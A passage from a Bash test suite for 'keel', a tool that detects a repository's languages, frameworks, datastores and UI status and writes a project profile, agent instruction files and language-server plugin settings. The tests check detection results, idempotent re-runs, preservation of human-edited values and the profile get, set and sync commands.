( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f/f","require-dev":{"pestphp/pest":"^3"}}\n' > composer.json )
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "vendor/bin/pest" ] && ok "a Pest project runs Pest" \
  || bad "php" "test was '$v_test'"
rm -rf "$d"

# Go's lint command depended on golangci-lint being installed on the machine running init, which
# freezes one laptop's answer into a file every teammate reads. The config file is the declaration.
d="$(fixture go)"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ -z "$v_lint" ] && ok "Go with no linter config gets no lint command" \
  || bad "go" "lint was '$v_lint', which came from this machine rather than the repo"
rm -rf "$d"

d="$(fixture go)"
printf 'linters:\n  enable: [errcheck]\n' > "$d/.golangci.yml"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_lint" = "golangci-lint run" ] && ok "a .golangci.yml is the declaration golangci-lint needs" \
  || bad "go" "lint was '$v_lint'"
rm -rf "$d"

# ---- verify commands for the languages added in this plan -------------------
# One assertion per language on the command that is not a guess, and one on a command that must
# stay null because the project declares no such tool. The null half is the half that matters:
# a profile with a wrong command fails at first use and teaches people to distrust the file.
d="$(fixture csharp)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_test" = "dotnet test" ] && ok "C# gets dotnet test" \
  || bad "verify csharp" "test was '$v_test'"
[ "$v_format" = "dotnet format --verify-no-changes" ] && ok "C# formats with the SDK formatter" \
  || bad "verify csharp" "format was '$v_format'"
rm -rf "$d"

d="$(fixture ruby)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_test" = "bundle exec rspec" ] && ok "Ruby with a spec dir gets rspec" \
  || bad "verify ruby" "test was '$v_test'"
[ -z "$v_lint" ] && ok "Ruby without rubocop declared gets no lint command" \
  || bad "verify ruby" "lint was guessed as '$v_lint'"
rm -rf "$d"

d="$(fixture kotlin)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_test" = "./gradlew test" ] && ok "Kotlin gets the Gradle test task" \
  || bad "verify kotlin" "test was '$v_test'"
[ "$v_typecheck" = "./gradlew compileKotlin" ] && ok "Kotlin typechecks with compileKotlin, not compileJava" \
  || bad "verify kotlin" "typecheck was '$v_typecheck'"
rm -rf "$d"

d="$(fixture swift)"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "swift test" ] && ok "Swift gets swift test" \
  || bad "verify swift" "test was '$v_test'"
rm -rf "$d"

d="$(fixture cpp)"
v_build="$(detect_in "$d" 'detect_verify build')"
v_test="$(detect_in "$d" 'detect_verify test')"
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_build" = "cmake --build build" ] && ok "CMake gets a build command" \
  || bad "verify cpp" "build was '$v_build'"
[ "$v_test" = "ctest --test-dir build" ] && ok "a CMake project that enables testing gets ctest" \
  || bad "verify cpp" "test was '$v_test'"
[ -z "$v_format" ] && ok "C++ without a .clang-format gets no format command" \
  || bad "verify cpp" "format was guessed as '$v_format'"
rm -rf "$d"

d="$(fixture lua)"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_typecheck" = "lua-language-server --check ." ] && ok "Lua with a .luarc.json gets a check command" \
  || bad "verify lua" "typecheck was '$v_typecheck'"
[ -z "$v_test" ] && ok "Lua without busted declared gets no test command" \
  || bad "verify lua" "test was guessed as '$v_test'"
rm -rf "$d"

# ---- language servers ------------------------------------------------------
# Every id asserted here is in claude-plugins-official. An id that is not real is worse than no
# suggestion: it lands in settings.json, fails to resolve, and the user distrusts the whole file.
plugins_of() {   # plugins_of <dir>
    python3 -c "import json;print(' '.join(json.load(open('$1/.claude/settings.json'))['enabledPlugins']))" 2>/dev/null
}
for pair in "csharp:csharp-lsp" "ruby:ruby-lsp" "kotlin:kotlin-lsp" "swift:swift-lsp" "cpp:clangd-lsp" "lua:lua-lsp"; do
    stack="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture "$stack")"
    ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
    case "$(plugins_of "$d")" in *"$want@claude-plugins-official"*) ok "$stack gets $want" ;;
      *) bad "lsp" "$stack got no $want: $(plugins_of "$d")" ;; esac
    rm -rf "$d"
done

# ---- polyglot repositories -------------------------------------------------
# A Python service behind a TypeScript app was described as TypeScript and nothing else, so the
# Python half got no language server and every skill reading the profile believed the repo was
# single-stack.
d="$(fixture polyglot)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(python3 -c "import json;s=json.load(open('$d/.keel/profile.json'))['stack'];print(s['language'],','.join(s['also']))" 2>/dev/null)"
[ "$got" = "typescript python" ] && ok "a polyglot repo records the second language in stack.also" \
  || bad "polyglot" "got '$got', want 'typescript python'"
case "$(plugins_of "$d")" in *pyright-lsp*) ok "the second language gets its language server too" ;;
  *) bad "polyglot" "no pyright-lsp: $(plugins_of "$d")" ;; esac
# The primary still drives the verify commands. A repo is not tested twice because it has two
# languages, and choosing which one runs is the user's call, not a detector's.
[ "$(verify_of "$d" test)" = "npm test" ] && ok "the primary language still drives verify" \
  || bad "polyglot" "test was '$(verify_of "$d" test)'"
rm -rf "$d"

# Single-stack repositories get an empty array rather than a missing key, so nothing downstream has
# to tell absent from empty.
d="$(fixture go)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(prof_of "$d" stack.also)" = "[]" ] \
  && ok "a single-stack repo gets an empty stack.also" || bad "polyglot" "stack.also is missing or not empty"
rm -rf "$d"

# ---- framework detection --------------------------------------------------
# Found by running init on a real NestJS service, which was detected as Next.js because the
# nestjs marker was OR'd into every iteration of the framework loop.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"@nestjs/core":"^10"},"scripts":{"test":"jest"}}' > package.json
  echo '{}' > tsconfig.json )
got="$(detect_in "$d" 'detect_stack | cut -d" " -f3')"
if [ "$got" = "nest" ]; then ok "a NestJS service is detected as nest"
else bad "framework" "got '$got', want 'nest'"; fi
rm -rf "$d"

# ---- has_ui ---------------------------------------------------------------
# Every profile was written with a hardcoded `has_ui: false`, so `coding-standards` never reached
# references/frontend.md on a project that had a frontend. The detector already existed in
# lib/detect-stack.sh; its answer was used to recommend plugins and then discarded.

ui_of() {  # ui_of <dir> -> the profile's stack.has_ui, printed as Python's True or False
    python3 -c "import json;print(json.load(open('$1/.keel/profile.json'))['stack']['has_ui'])" 2>/dev/null
}

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"react":"^18"},"scripts":{"test":"jest"}}' > package.json )
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(ui_of "$d")" = "True" ] && ok "a React project has has_ui true" \
  || bad "has_ui" "React project got '$(ui_of "$d")', want True"
rm -rf "$d"

# A static site is a UI with no framework and no package.json to name one.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '<!doctype html>\n' > index.html )
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "true" ] && ok "a static site has has_ui true" \
  || bad "has_ui" "static site got '$got', want true"
rm -rf "$d"

# The other direction matters as much, and this one passes before the fix: it is here to hold the
# detector to backend frameworks rather than to anything shaped like JavaScript.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"@nestjs/core":"^10"},"scripts":{"test":"jest"}}' > package.json )
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "false" ] && ok "a NestJS service has has_ui false" \
  || bad "has_ui" "NestJS service got '$got', want false"
rm -rf "$d"

# APEX pages are served from inside the database, so an APEX export has neither a local public/ nor
# an index.html for the fallback below to find. The framework name is the only signal there is.
d="$(fixture plsql)"
printf '{"apex_version":"23.2"}\n' > "$d/manifest.json"
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "true" ] && ok "an APEX export has has_ui true" \
  || bad "has_ui" "APEX export got '$got', want true"
rm -rf "$d"

# The only field that was wrong rather than empty. detect_has_ui keys on a framework list and then
# falls back to public/ or index.html, and a Flutter application has neither, so every mobile app
# reported has_ui false. FR-06.
d="$(fixture dart-flutter)"
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "true" ] && ok "a Flutter application has has_ui true" \
  || bad "has_ui" "Flutter project got '$got', want true"
rm -rf "$d"

d="$(fixture dart-pure)"
got="$(detect_in "$d" detect_has_ui)"
[ "$got" = "false" ] && ok "a pure Dart package has has_ui false" \
  || bad "has_ui" "pure Dart got '$got', want false"
rm -rf "$d"

# ---- datastores -----------------------------------------------------------
# The same defect has_ui had, in the field beside it: stack.datastores was written as a hardcoded
# empty list. Found on the existing-service pilot, whose repository declared postgres and redis
# twice over, in its dependencies and in its compose file, and was recorded as using neither.
# templates/keel-profile.example.json advertises exactly that pair, so the field read as detected.

stores_of() {  # stores_of <dir> -> the profile's stack.datastores, comma-separated and sorted
    python3 -c "import json;print(','.join(sorted(json.load(open('$1/.keel/profile.json'))['stack']['datastores'])))" 2>/dev/null
}

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","dependencies":{"pg":"^8","ioredis":"^5"},"scripts":{"test":"jest"}}' > package.json )
got="$(detect_in "$d" 'detect_datastores | sort | tr "\n" " "')"
[ "$got" = "postgres redis " ] \
  && ok "client libraries in package.json are read as datastores" \
  || bad "datastores" "dependencies gave '$got', want 'postgres redis '"
rm -rf "$d"

# The second signal, and the one that is language-independent: a managed database reached over a
# connection string leaves nothing in a dependency list of a language keel does not parse, but the
# service a developer runs locally is named in the compose file.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'module f\n\ngo 1.22\n' > go.mod
  printf 'services:\n  db:\n    image: postgres:15-alpine\n  cache:\n    image: redis:7-alpine\n' \
    > docker-compose.yml )
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(stores_of "$d")" = "postgres,redis" ] \
  && ok "compose service images are read as datastores" \
  || bad "datastores" "compose file gave '$(stores_of "$d")', want postgres,redis"
rm -rf "$d"

# The other direction, as with has_ui: a project with no store must report none rather than a guess.
# `[]` is the right answer here and the wrong one above, and only this pair tells them apart.
d="$(fixture node-ts)"
got="$(detect_in "$d" 'detect_datastores | sort | tr "\n" " "')"
[ -z "$got" ] && ok "a project with no datastore reports none" \
  || bad "datastores" "a storeless project got '$got', want nothing"
rm -rf "$d"

# The pair matched a bare `mongo` under -i, so any package whose name merely starts with those five
# letters was profiled as MongoDB. `mongol`, a real pub.dev package for Mongolian vertical text,
# was the instance found, over a corpus of about 100 real pub.dev names. Tightened 2026-08-30, D3.
d="$(fixture dart-pure)"
printf '  mongol: ^2.0.0\n' >> "$d/pubspec.yaml"
got="$(detect_in "$d" 'detect_datastores | tr "\n" " "')"
case "$got" in
  *mongodb*) bad "datastores" "mongol was profiled as mongodb: '$got'" ;;
  *)         ok "a package merely starting with mongo is not MongoDB" ;;
esac
rm -rf "$d"

# The other side, and the reason this is a separate task: the pair is shared by all fifteen
# languages, so tightening it has to be shown not to have stopped detecting the real thing. One
# declaration per manifest shape, because the shapes differ and a single case would pass with the
# alternation broken for four of them.
for spec in 'node-ts|package.json|{"name":"m","dependencies":{"mongodb":"^6"}}' \
            'python|requirements.txt|pymongo==4.6' \
            'ruby|Gemfile|gem "mongo"' \
            'go|go.mod|require go.mongodb.org/mongo-driver v1.13.1'; do
    fx="${spec%%|*}"; rest="${spec#*|}"; file="${rest%%|*}"; line="${rest#*|}"
    d="$(fixture "$fx")"
    printf '%s\n' "$line" >> "$d/$file"
    got="$(detect_in "$d" 'detect_datastores | tr "\n" " "')"
    case "$got" in
      *mongodb*) ok "$fx still detects a real MongoDB declaration" ;;
      *)         bad "datastores" "$fx lost mongodb: '$got'" ;;
    esac
    rm -rf "$d"
done

# FR-15 named sqflite only, and a realistic 30-package pubspec reported nothing for seven common
# stores. Widened 2026-08-30, D2, to the ones that map onto a backend keel already names, plus
# firestore. Each maps onto what it actually talks to rather than onto its own package name.
d="$(fixture dart-pure)"
cat >> "$d/pubspec.yaml" <<'P'
  drift: ^2.14.0
  sembast: ^3.5.0
  supabase_flutter: ^2.0.0
  cloud_firestore: ^4.13.0
P
got="$(detect_in "$d" 'detect_datastores | tr "\n" " "')"
for want in sqlite postgres firestore; do
    case "$got" in
      *"$want"*) ok "a Flutter pubspec naming its store reports $want" ;;
      *)         bad "datastores" "wanted $want in '$got'" ;;
    esac
done
rm -rf "$d"

# The three deliberately left out. hive, isar and objectbox are embedded libraries with no server
# product behind them, so there is no existing name to map them onto and inventing three would be a
# vocabulary decision rather than a detection one. This case is what stops someone adding them
# without one: it fails loudly if they appear, rather than going quietly out of date.
d="$(fixture dart-pure)"
cat >> "$d/pubspec.yaml" <<'P'
  hive: ^2.2.3
  isar: ^3.1.0
  objectbox: ^2.5.0
P
got="$(detect_in "$d" 'detect_datastores | tr "\n" " "')"
if [ ! -f "$d/pubspec.yaml" ]; then
    bad "datastores" "the fixture lost its pubspec.yaml, so this case proves nothing"
elif [ -n "$got" ]; then
    bad "datastores" "an embedded-store pubspec reported '$got', want nothing. If this is deliberate, it is a vocabulary decision and needs one"
else
    ok "hive, isar and objectbox stay unreported, as D2 decided"
fi
rm -rf "$d"

# The same rule D3 applied to `mongo`, for the name task 3 added beside it. `drift` is a five-letter
# English word, so a bare substring matched `drift-zoom` on npm and `driftctl` in a go.mod, and the
# pair is read for all fifteen languages. A non-letter boundary does not separate them, because
# `drift-zoom` has one; the declaration shape does, and it is the same shape `"pg"` is written in.
for spec in 'node-ts|package.json|{"name":"m","dependencies":{"drift-zoom":"^1.5"}}' \
            'go|go.mod|require github.com/snyk/driftctl v0.40.0'; do
    fx="${spec%%|*}"; rest="${spec#*|}"; file="${rest%%|*}"; line="${rest#*|}"
    d="$(fixture "$fx")"
    printf '%s\n' "$line" >> "$d/$file"
    got="$(detect_in "$d" 'detect_datastores | tr "\n" " "')"
    case "$got" in
      *sqlite*) bad "datastores" "$fx: a package merely containing drift was profiled as sqlite: '$got'" ;;
      *)        ok "$fx: a package merely containing drift is not SQLite" ;;
    esac
    rm -rf "$d"
done

# sqflite is SQLite on the device and appears in 13 of the 15 repositories measured on 2026-08-29.
# The existing `sqlite` pair does not match it: `sqflite` does not contain the substring `sqlite`.
# FR-15.
d="$(fixture dart-flutter)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(stores_of "$d")" = "sqlite" ] && ok "a Flutter project declaring sqflite names sqlite" \
  || bad "datastores" "got '$(stores_of "$d")', want sqlite"
rm -rf "$d"

d="$(fixture dart-pure)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
# The profile-exists guard is not ceremony. `stores_of` swallows every error with 2>/dev/null and
# returns the empty string when .keel/profile.json is missing or malformed, so a bare `[ -z ]` here
# passes when `keel init` crashed and wrote nothing at all. That is why this case passed before the
# implementation existed. Measured by task 7's review, 2026-08-30.
got="$(stores_of "$d")"
if [ ! -f "$d/.keel/profile.json" ]; then
    bad "datastores" "dart-pure wrote no .keel/profile.json; keel init failed"
elif [ -n "$got" ]; then
    bad "datastores" "got '$got', want nothing"
else
    ok "a Dart package with no store dependency names no datastore"
fi
rm -rf "$d"

# NFR-01. lib/detect-stack.sh uses no sed, sort, uniq or tr, and its own comment says a change must
# not be the one that introduces them. The same property assertion tests/test-apex-export.sh makes
# about lib/apex_render.py, for the same reason: a property nobody checks is one that drifts.
for cmd in sed sort uniq tr; do
    # Full-line comments are stripped before the search. Without that this check fails on
    # unmodified code: the comment at lib/detect-stack.sh:102-104 names all four in prose, and the
    # `nor tr` clause matches, so a whole-file grep fails on unmodified code. Verified against the
    # unmodified file before this was written into the plan.
    if grep -v '^[[:space:]]*#' "$ROOT/lib/detect-stack.sh" | grep -qE "(^|[^-_a-zA-Z])$cmd([[:space:]]|\$)"; then
        bad "detect-stack purity" "lib/detect-stack.sh now invokes $cmd"
    else
        ok "lib/detect-stack.sh still invokes no $cmd"
    fi
done

# NFR-02, in the form stated at the head of this task. This plan edited four shared functions:
# detect_languages (the marker, evaluated on every repository), detect_datastores (the manifest list
# and the `sqlite` pair), detect_has_ui (the framework list) and detect_plugins (the `fw` binding and
# the `playwright` arm). is_plsql_tree changed by a comment only.
#
# These four fixtures are chosen on detect_datastores' manifest gate, which is what actually
# discriminates: every fixture in the suite reaches detect_has_ui, so "reaches a shared function"
# would select nothing. node-ts, python, go and ruby contribute package.json, pyproject.toml, go.mod
# and Gemfile, so all four reach the eight-pair grep loop, whereas csharp, swift, cpp and lua hit
# `[ -z "$files" ] && return 0` and would prove nothing.
#
# The honest limit: all four expect has_ui false, so this block never reaches detect_plugins' edited
# branch, which is gated on has_ui being true. That branch is covered by the apex case in the
# `---- dart ----` block, not here.
for f in node-ts python go ruby; do
    d="$(fixture "$f")"
    ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
    { read -r p_lang; read -r p_ui; } <<EOF
$(prof_of "$d" stack.language stack.has_ui)
EOF
    case "$f:$p_lang $p_ui" in
      "node-ts:typescript False"|"python:python False"|"go:go False"|"ruby:ruby False")
        ok "$f keeps its stack under the Dart change" ;;
      *) bad "regression" "$f got '$p_lang $p_ui'" ;;
    esac
    # Guarded on the profile existing, for the reason task 7's review measured: `stores_of` swallows
    # errors and returns the empty string when .keel/profile.json is absent, so a bare `[ -z ]`
    # passes when `keel init` crashed and wrote nothing. This block is the primary regression guard
    # for the whole change, across four fixtures, so a check that green-lights a crashed init is the
    # last thing it can afford to be.
    stores="$(stores_of "$d")"
    if [ ! -f "$d/.keel/profile.json" ]; then
        bad "regression" "$f wrote no .keel/profile.json; keel init failed"
    elif [ -n "$stores" ]; then
        bad "regression" "$f datastores got '$stores', want nothing"
    else
        ok "$f keeps an empty datastore list"
    fi
    rm -rf "$d"
done

# ---- profile ---------------------------------------------------------------

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "import json;json.load(open('$d/.keel/profile.json'))" 2>/dev/null \
  && ok "profile is valid JSON" || bad "profile JSON" "did not parse"
[ -f "$d/docs/keel/README.md" ] && ok "scaffolds the docs root" || bad "docs root" "missing"
[ -f "$d/docs/keel/prompting.md" ] && ok "installs the prompting cheatsheet" || bad "cheatsheet" "missing"
[ -f "$d/AGENTS.md" ] && ok "writes AGENTS.md for other agents" || bad "AGENTS.md" "missing"

# The rendered block must carry no unsubstituted placeholder.
grep -q '{{' "$d/CLAUDE.md" && bad "placeholders" "unsubstituted {{...}} left in CLAUDE.md" \
  || ok "every placeholder is substituted"
grep -q 'npm test' "$d/CLAUDE.md" && ok "renders the real verify command" || bad "render" "no npm test"

# ---- idempotency -----------------------------------------------------------

before="$(md5 -q "$d/CLAUDE.md" 2>/dev/null || md5sum "$d/CLAUDE.md" | cut -d' ' -f1)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
after="$(md5 -q "$d/CLAUDE.md" 2>/dev/null || md5sum "$d/CLAUDE.md" | cut -d' ' -f1)"
[ "$before" = "$after" ] && ok "re-running init is byte-identical" || bad "idempotency" "CLAUDE.md changed"
rm -rf "$d"

# ---- preserving user content ----------------------------------------------

d="$(fixture node-ts)"
printf '# My project\n\nMy own notes that must survive.\n' > "$d/CLAUDE.md"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
grep -q 'My own notes that must survive' "$d/CLAUDE.md" \
  && ok "existing CLAUDE.md content is preserved" || bad "preserve" "user content lost"
grep -q 'keel:start' "$d/CLAUDE.md" && ok "block is appended to an existing file" || bad "append" "no marker"
rm -rf "$d"

# ---- marker corruption is reported, not repaired --------------------------

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
cat "$d/CLAUDE.md" "$d/CLAUDE.md" > "$d/CLAUDE.md.dup" && mv "$d/CLAUDE.md.dup" "$d/CLAUDE.md"
if ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 ); then
  bad "duplicate markers" "init succeeded on a corrupted file"
else ok "duplicate markers are reported, not silently fixed"; fi
rm -rf "$d"

# ---- the gitignored docs root --------------------------------------------

d="$(fixture node-ts)"
printf 'docs/\n' > "$d/.gitignore"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
rc=$?
[ "$rc" -ne 0 ] && ok "refuses when the docs root is gitignored" \
  || bad "gitignored docs" "init proceeded silently (exit $rc)"
rm -rf "$d"

# ---- and the remedy it prints has to be one git will honour ----------------
# Found by running init on a real project whose .gitignore had a bare `docs` line. keel printed
# `!docs/keel/`, which git cannot honour: a negation never reaches inside an excluded directory, so
# following the printed advice left init refusing exactly as before. The patterns are read back out
# of the message, so this passes only while what keel prints is what actually works.

d="$(fixture node-ts)"
printf 'docs\n' > "$d/.gitignore"
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
printf '%s\n' "$out" | sed -n 's/^keel:[[:space:]]*\([^[:space:]][^[:space:]]*\)$/\1/p' >> "$d/.gitignore"
if ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 ); then
  ok "the .gitignore remedy keel prints un-ignores the docs root"
else
  bad "gitignored docs" "init still refused after applying the remedy it printed"
fi
rm -rf "$d"

# ---- an existing profile is never clobbered -------------------------------
# Found by running init on a real project: it replaced a hand-corrected test command with a
# detected one that could not run. Detection is a starting point, not an authority.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]["test"]="npm test -- --runInBand"
d["project"]["description"]="written by a human"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
case "$got" in
  *runInBand*) ok "a corrected verify command survives re-init" ;;
  *) bad "clobbering" "init overwrote a human-corrected command with '$got'" ;;
esac
got="$(prof_of "$d" project.description)"
if [ "$got" = "written by a human" ]; then ok "human-written profile fields survive re-init"
else bad "clobbering" "description was reset to '$got'"; fi
rm -rf "$d"

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
python3 - "$d" <<'PY'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["verify"]["test"]="wrong"
p.write_text(json.dumps(d,indent=2)+"\n")
PY
( cd "$d" && "$KEEL" init -y --force >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
if [ "$got" = "npm test" ]; then ok "--force does overwrite"
else bad "--force" "got '$got'"; fi
rm -rf "$d"

# ---- keel profile get and set ---------------------------------------------
# A fact recorded at init can turn out wrong later: a project that gains a UI during design is
# the case this exists for. Re-running init cannot correct it, because merge_profile keeps the
# human side of every non-empty value, so there has to be a supported way in that is not a text
# editor pointed at JSON.

d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )

got="$( cd "$d" && "$KEEL" profile get stack.language 2>&1 )"
[ "$got" = "typescript" ] && ok "profile get prints a value" || bad "profile get" "got '$got'"

( cd "$d" && "$KEEL" profile set stack.has_ui true >/dev/null 2>&1 )
got="$(prof_of "$d" stack.has_ui)"
[ "$got" = "True" ] && ok "profile set writes a JSON boolean, not the string 'true'" \
  || bad "profile set bool" "got '$got', want True"

( cd "$d" && "$KEEL" profile set verify.lint 'eslint . --max-warnings 0' >/dev/null 2>&1 )
got="$(prof_of "$d" verify.lint)"
[ "$got" = "eslint . --max-warnings 0" ] && ok "profile set writes a string containing spaces" \
  || bad "profile set string" "got '$got'"

( cd "$d" && "$KEEL" profile set verify.build null >/dev/null 2>&1 )
got="$(prof_of "$d" verify.build)"
[ "$got" = "None" ] && ok "profile set null clears a value" || bad "profile set null" "got '$got'"

# A typo has to fail loudly and name itself. Writing stack.hasUI beside stack.has_ui creates a key
# nothing reads, and the caller walks away believing the fact was recorded.
out="$( cd "$d" && "$KEEL" profile set stack.hasUI true 2>&1 )"
case "$out" in
  *hasUI*) ok "profile set refuses a path the profile does not have, and names it" ;;
  *)       bad "unknown path" "refusal did not name the path: '$out'" ;;
esac
python3 -c "import json,sys;sys.exit('hasUI' in json.load(open('$d/.keel/profile.json'))['stack'])" \
  && ok "the refused key was not written" || bad "unknown path" "stack.hasUI was written anyway"

# init owns this one. It records which keel wrote the profile, and doctor reads it to say the
# project is behind; a hand-set value makes that unanswerable.
out="$( cd "$d" && "$KEEL" profile set keel_version 9.9.9 2>&1 )"
case "$out" in
  *keel_version*) ok "profile set refuses keel_version, which init owns" ;;
  *)              bad "keel_version" "refusal did not name the field: '$out'" ;;
esac
got="$(prof_of "$d" keel_version)"
[ "$got" != "9.9.9" ] && ok "keel_version was left alone" || bad "keel_version" "it was rewritten"
rm -rf "$d"

# ---- profile sync ----------------------------------------------------------
# S-01. The artifacts map named where a project's documents live and nothing ever filled it: six
# keys, six nulls, on the repository that dogfoods the tool. sync fills the three whose default is
# one unambiguous location. FR-01, FR-03, FR-05, FR-09, FR-15.
#
# The root is read from the profile rather than written as `docs`: a fresh init writes
# `docs/keel`, `bin/keel#shellcheck source=lib/merge-claude-md.sh`, and this repository's own profile says `docs`, so a hardcoded spelling
# passes here and fails for the next person who runs it somewhere else.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/$root/decisions" "$d/$root/plans"
printf 'x\n' > "$d/$root/snapshot.md"
printf 'x\n' > "$d/$root/decisions/ADR-0001-x.md"
printf 'x\n' > "$d/$root/plans/2026-01-01-x.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.snapshot artifacts.decisions artifacts.plans | tr '\n' ' ')"
want="$root/snapshot.md $root/decisions $root/plans "
[ "$got" = "$want" ] && ok "keel profile sync fills the keys whose default is present" \
  || bad "profile sync" "got '$got', want '$want'"
rm -rf "$d"

# FR-05. A default location that is not there leaves the key null. Writing an absent path would
# convert a silent gap into a hard doctor failure,
# `bin/keel#Any artifact mapped to a path must exist`
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/$root/plans"
printf 'x\n' > "$d/$root/plans/2026-01-01-x.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.snapshot artifacts.plans | tr '\n' ' ')"
[ "$got" = "None $root/plans " ] && ok "sync leaves a key null when its default is absent" \
  || bad "profile sync" "got '$got', want 'None $root/plans '"
rm -rf "$d"

# S-02, FR-02. The map is documented as the user's override for a document that lives elsewhere.
# A command that means to help must not discard a deliberate value, so a key that already holds one
# is skipped even when the default is sitting there too.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/wiki"; printf 'x\n' > "$d/wiki/overview.md"
printf 'x\n' > "$d/$root/snapshot.md"
( cd "$d" && "$KEEL" profile set artifacts.snapshot wiki/overview.md >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
got="$(prof_of "$d" artifacts.snapshot)"
[ "$got" = "wiki/overview.md" ] && ok "sync leaves a key that is already set" \
  || bad "profile sync" "sync overwrote a deliberate override with '$got'"
rm -rf "$d"

# S-02, FR-07. Idempotent, asserted byte for byte. A second run that rewrites the same values
# through a JSON dump can still reorder or reformat, and on a tracked file that is a spurious diff
# somebody has to read. "No key changed" is the weaker claim and it is not the one that matters.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
root="$(prof_of "$d" docs_root)"
mkdir -p "$d/$root/plans"; printf 'x\n' > "$d/$root/plans/2026-01-01-x.md"
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 )
before="$(cat "$d/.keel/profile.json")"
out="$( cd "$d" && "$KEEL" profile sync 2>&1 )"
after="$(cat "$d/.keel/profile.json")"
[ "$before" = "$after" ] && ok "a second sync run changes nothing" \
  || bad "profile sync" "a second run rewrote .keel/profile.json"
case "$out" in
  *"no artifact key changed"*) ok "sync says so when it changed nothing" ;;
  *) bad "profile sync" "a no-op run said nothing useful: '$out'" ;;
esac
rm -rf "$d"

# S-05, FR-16. Filling nothing is the correct outcome on a repository already in order, and a
# non-zero exit there would fail a pre-push hook for a state that is fine.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile sync >/dev/null 2>&1 ) \
  && ok "sync exits 0 when it fills nothing" \
  || bad "profile sync" "sync exited non-zero on a repository with nothing to fill"
rm -rf "$d"

# S-03, FR-04. prd, stories and architecture default to one file per slug, so a repository with
# five PRDs has no single path to record. Skipping them silently reads as a bug, so the command
# says which it skipped and why.
#
# The one-PRD case is the one that fails quietly. A repository with exactly one PRD looks fillable,
# and filling it would be right today and wrong the moment a second PRD is written: the rule is
# about the shape of the default, not about how many documents happen to be there.
for n in 5 1; do
    d="$(fixture node-ts)"
    ( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
    root="$(prof_of "$d" docs_root)"
    mkdir -p "$d/$root/prd"
